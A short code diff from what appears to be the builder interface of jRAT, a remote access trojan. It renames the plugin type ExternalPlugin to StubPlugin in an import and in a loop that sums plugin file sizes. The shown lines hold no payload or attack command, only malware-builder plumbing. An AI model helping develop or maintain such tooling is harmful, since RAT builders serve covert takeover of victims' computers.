@@ -30,8 +30,8 @@ import pro.jrat.build.Build;
 import pro.jrat.build.BuildExecutable;
 import pro.jrat.common.crypto.Crypto;
 import pro.jrat.common.crypto.EncryptionKey;
-import pro.jrat.extensions.ExternalPlugin;
 import pro.jrat.extensions.PluginList;
+import pro.jrat.extensions.StubPlugin;
 import pro.jrat.io.Files;
 import pro.jrat.listeners.AdvancedBuildListener;
 import pro.jrat.settings.Settings;
@@ -291,7 +291,7 @@ public class PanelBuildFinal extends JPanel {
 
 		PluginList list = plugins.getList();
 		if (list != null) {
-			for (ExternalPlugin p : list.plugins) {
+			for (StubPlugin p : list.plugins) {
 				size += new File(p.path).length() / 1024;
 			}
 		}
